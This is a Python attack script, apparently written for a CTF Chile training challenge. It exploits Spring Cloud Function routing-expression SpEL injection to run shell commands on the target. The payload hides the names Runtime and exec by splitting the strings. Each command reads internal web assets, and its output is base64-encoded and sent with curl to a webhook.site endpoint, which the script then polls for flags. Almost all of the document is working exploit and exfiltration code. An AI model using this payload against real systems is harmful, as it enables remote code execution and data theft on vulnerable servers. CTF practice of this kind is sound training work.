#!/usr/bin/env python3
"""
CTF Chile - Cazador de assets estáticos y contenido web
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32785"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook para caza de assets...")
uuid_resp = requests.post("https://webhook.site/token", timeout=10)
UUID = uuid_resp.json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def asset_hunt(cmd, tag):
    shell = f"({cmd}) | head -25 | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    payload = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'

    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"[{r.status_code}] {tag}")
        return r.status_code == 500
    except Exception as e:
        print(f"[ERR] {tag}: {str(e)[:35]}...")
        return False

print(f"\n{'='*70}")
print("🎯 CAZADOR DE ASSETS ESTÁTICOS Y CONTENIDO WEB")
print("✅ /css/style.css funciona - buscando endpoints similares")
print(f"{'='*70}")

print(f"\n[1] ANALIZAR EL CSS COMPLETO")
# Obtener todo el contenido del CSS que sabemos funciona
asset_hunt("curl -s http://localhost:8080/css/style.css", "css_complete")

print(f"\n[2] BUSCAR OTROS ARCHIVOS CSS")
css_files = [
    "css/main.css",
    "css/app.css",
    "css/bootstrap.css",
    "css/custom.css",
    "css/theme.css"
]

for css_file in css_files:
    asset_hunt(f"curl -s http://localhost:8080/{css_file}", f"css_{css_file.split('/')[-1].replace('.', '_')}")

print(f"\n[3] BUSCAR ARCHIVOS JAVASCRIPT")
js_files = [
    "js/app.js",
    "js/main.js",
    "js/script.js",
    "js/custom.js",
    "js/bootstrap.js"
]

for js_file in js_files:
    asset_hunt(f"curl -s http://localhost:8080/{js_file}", f"js_{js_file.split('/')[-1].replace('.', '_')}")

print(f"\n[4] ANALIZAR LA PÁGINA PRINCIPAL COMPLETA")
# Obtener toda la página HTML principal
asset_hunt("curl -s http://localhost:8080/", "html_homepage_full")

print(f"\n[5] BUSCAR ARCHIVOS HTML ESPECÍFICOS")
html_files = [
    "index.html",
    "home.html",
    "admin.html",
    "login.html",
    "vault.html",
    "flag.html"
]

for html_file in html_files:
    asset_hunt(f"curl -s http://localhost:8080/{html_file}", f"html_{html_file.replace('.', '_')}")

print(f"\n[6] EXPLORAR DIRECTORIOS ESTÁTICOS COMUNES")
directories = [
    "images/",
    "img/",
    "fonts/",
    "assets/",
    "static/",
    "public/"
]

for directory in directories:
    asset_hunt(f"curl -s http://localhost:8080/{directory}", f"dir_{directory.replace('/', '_')}")

print(f"\n[7] BUSCAR ARCHIVOS DE CONFIGURACIÓN WEB")
config_files = [
    "robots.txt",
    "sitemap.xml",
    "manifest.json",
    "service-worker.js",
    ".htaccess"
]

for config_file in config_files:
    asset_hunt(f"curl -s http://localhost:8080/{config_file}", f"cfg_{config_file.replace('.', '_')}")

print(f"\n[8] PROBAR RUTAS ESPECÍFICAS DE OMNIVAULT")
omnivault_paths = [
    "omnivault.html",
    "vault.html",
    "bank.html",
    "admin.html",
    "infiltracion.html",
    "flag.html"
]

for path in omnivault_paths:
    asset_hunt(f"curl -s http://localhost:8080/{path}", f"omni_{path.replace('.', '_')}")

print(f"\n[9] BUSCAR ARCHIVOS OCULTOS O META")
hidden_files = [
    ".well-known/security.txt",
    "security.txt",
    "flag.txt",
    "readme.txt",
    "info.txt"
]

for hidden_file in hidden_files:
    asset_hunt(f"curl -s http://localhost:8080/{hidden_file}", f"hidden_{hidden_file.replace('/', '_').replace('.', '_')}")

print(f"\n[10] ANALIZAR HEADERS DE RESPUESTA")
# Obtener headers completos de la página principal
asset_hunt("curl -I http://localhost:8080/", "headers_main")
asset_hunt("curl -I http://localhost:8080/css/style.css", "headers_css")

print(f"\n⏰ Esperando resultados de la caza de assets...")
time.sleep(20)

# Análisis exhaustivo
print(f"\n🔍 ANÁLISIS EXHAUSTIVO DE ASSETS...")
try:
    r = requests.get(f"https://webhook.site/token/{UUID}/requests", timeout=25)
    data = r.json().get("data", [])

    flags_found = []
    working_assets = []
    html_pages = []
    interesting_content = []

    print(f"Total assets analizados: {len(data)}")

    for req in data[:50]:
        url = req.get("url", "")
        tag = url.split(UUID)[-1].split("?")[0].lstrip("/")
        query = req.get("query", {})
        raw_data = query.get("d", "")

        if isinstance(raw_data, list):
            raw_data = raw_data[0] if raw_data else ""

        if raw_data:
            try:
                decoded = base64.b64decode(raw_data).decode("utf-8", "replace")

                # Skip empty responses and "Not Found" responses
                if len(decoded.strip()) < 10 or "Not Found" in decoded:
                    continue

                print(f"\n{'='*60}")
                print(f"📄 [{tag.upper()}]")
                print(f"{'='*60}")
                print(decoded[:500])
                if len(decoded) > 500:
                    print("...(truncado)")

                # BUSCAR FLAGS DIRECTOS
                if "ctfchile{" in decoded.lower():
                    flags_found.append((tag, decoded))
                    print(f"\n🚩🚩🚩 FLAG ENCONTRADO EN {tag}! 🚩🚩🚩")

                # Detectar assets que funcionan
                working_assets.append((tag, len(decoded)))

                # Clasificar contenido
                if tag.startswith("html"):
                    html_pages.append((tag, decoded[:300]))

                # Buscar contenido sospechoso
                suspicious_keywords = ["flag", "secret", "admin", "password", "vault", "ctf", "infiltracion"]
                for keyword in suspicious_keywords:
                    if keyword in decoded.lower():
                        interesting_content.append((tag, f"Contains '{keyword}': {decoded[:200]}"))
                        print(f"🔍 KEYWORD '{keyword}' encontrada en {tag}")
                        break

                # Buscar patrones codificados en comentarios HTML
                import re
                html_comments = re.findall(r'<!--(.*?)-->', decoded, re.DOTALL)
                for comment in html_comments:
                    if "ctfchile" in comment.lower() or "flag" in comment.lower():
                        flags_found.append((f"{tag}_comment", comment.strip()))
                        print(f"🚩 FLAG EN COMENTARIO HTML: {comment.strip()}")

                # Buscar variables JavaScript
                js_vars = re.findall(r'var\s+\w+\s*=\s*["\'][^"\']*["\']', decoded)
                for var in js_vars:
                    if "ctfchile" in var.lower():
                        flags_found.append((f"{tag}_js_var", var))
                        print(f"🚩 FLAG EN VARIABLE JS: {var}")

            except Exception as e:
                print(f"\n[{tag}] (decode error): {raw_data[:100]}...")

    # RESUMEN FINAL
    print(f"\n{'='*70}")
    print(f"🎯 RESUMEN FINAL DE CAZA DE ASSETS")
    print(f"{'='*70}")

    if flags_found:
        print(f"🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
        for tag, flag in flags_found:
            print(f"    📍 UBICACIÓN: {tag}")
            print(f"    🎯 CONTENIDO: {flag[:200]}...")
            if "ctfchile{" in flag:
                print(f"    ✅ ¡INFILTRACIÓN COMPLETADA!")

    if working_assets:
        print(f"\n✅ ASSETS ACCESIBLES: {len(working_assets)}")
        for tag, size in working_assets:
            print(f"    - {tag}: {size} caracteres")

    if html_pages:
        print(f"\n📄 PÁGINAS HTML: {len(html_pages)}")
        for tag, content in html_pages:
            print(f"    - {tag}: {content[:120]}...")

    if interesting_content:
        print(f"\n🔍 CONTENIDO SOSPECHOSO: {len(interesting_content)}")
        for tag, content in interesting_content:
            print(f"    - {content[:150]}...")

    if not flags_found:
        print(f"❓ Si no se encontraron flags, pueden estar:")
        print(f"   🔐 Codificados en Base64 en los assets")
        print(f"   🎯 En elementos HTML ocultos con display:none")
        print(f"   🔑 En variables JavaScript que se cargan dinámicamente")
        print(f"   📄 En metadatos o headers de respuesta")

except Exception as e:
    print(f"[!] Error en análisis: {e}")

print(f"\n🔗 Webhook assets: https://webhook.site/#!/{UUID}")
print(f"{'='*70}")